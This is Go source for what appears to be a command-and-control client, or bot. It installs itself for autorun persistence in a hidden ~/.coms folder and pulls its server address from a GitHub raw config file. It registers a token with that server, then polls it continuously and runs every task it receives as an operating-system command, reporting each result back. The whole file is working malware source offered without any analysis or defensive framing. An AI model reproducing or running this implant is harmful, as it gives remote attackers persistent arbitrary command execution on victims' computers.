package main

import (
	inter "./interaction"
	auth "./auth"
	tasking "./task"
	autorunInstall "./autorunInstall"
	"net/http"
	"fmt"
	"net/url"
	"runtime"
	"os"
    "io/ioutil"
    "strings"
    "time"
    "os/exec"
    "encoding/json"
)

func main() {
	ConfigUrl := "https://raw.githubusercontent.com/Altrul/config/master/ip_coms"

	proxy := false
	OS := runtime.GOOS
	client := &http.Client{}
	home := os.Getenv("HOME") + "/"

	err := os.Mkdir(home + ".coms", 0750)

	executable, _ := os.Executable()

	exec.Command("cp", executable, home + ".coms")

	autorunInstall.Install(executable)

	if(proxy) {
		proxyPath := ""
		if (OS == "linux") {
			proxyPath = home + ".coms/proxy"
		} else {
			fmt.Println("NOT LINUX")
		}
	    proxyUrlByte, err := ioutil.ReadFile(proxyPath)
	    if err != nil {
	        fmt.Println("File reading error", err)
	        return
	    }
	    proxyUrlStr := string(proxyUrlByte)
	    proxyUrlStr = strings.Replace(proxyUrlStr, "\n", "", -1)
		proxyUrl, _ := url.Parse(string(proxyUrlStr))

		client = &http.Client{Transport: &http.Transport{Proxy: http.ProxyURL(proxyUrl)}}
	}

	ServerIp := inter.GetHttp(ConfigUrl, client)
	ServerIp = ServerIp[:len(ServerIp) - 1]

	//fmt.Println(inter.GetHttp(ServerIp, client))

    token, err := ioutil.ReadFile(home +".coms/token")
    if err != nil || string(token) == "" {
		token = []byte(auth.Register(ServerIp, client))
		f, err := os.Create(home + ".coms/token")
		if err != nil {
			fmt.Println(err)
		}
		defer f.Close()
		_, err = f.Write(token)
		if err != nil {
			fmt.Println(err)
		}
	}

	connect_responce := inter.Response{}

	token_data := inter.Token {
		Token: string(token),
	}

	token_json, _ := json.Marshal(token_data)

	connect_result := inter.PutHttp(ServerIp + "/api/connect", client, token_json)

	json.Unmarshal([]byte(connect_result), &connect_responce)

	if connect_responce.Error != "" {
		token = []byte(auth.Register(ServerIp, client))
		f, err := os.OpenFile(home + ".coms/token", os.O_RDWR|os.O_TRUNC, 0750)
		if err != nil {
			fmt.Println(err)
		}
		defer f.Close()
		_, err = f.Write(token)
	}

	for true {
		tasks := tasking.GetTask(ServerIp, client, token).Tasks
		for _, task := range tasks {
			command := strings.Fields(task.Args)[0]
			args := strings.Fields(task.Args)[1:]
			cmd := exec.Command(command, args...)
			_, err := cmd.Output()
			if err != nil {
				tasking.SendReport(ServerIp, client, token, err.Error(), task.Id)
			} else {
				tasking.SendReport(ServerIp, client, token, "Script executed successfully", task.Id)
			}
		}
		time.Sleep(time.Second / 2)
	}
}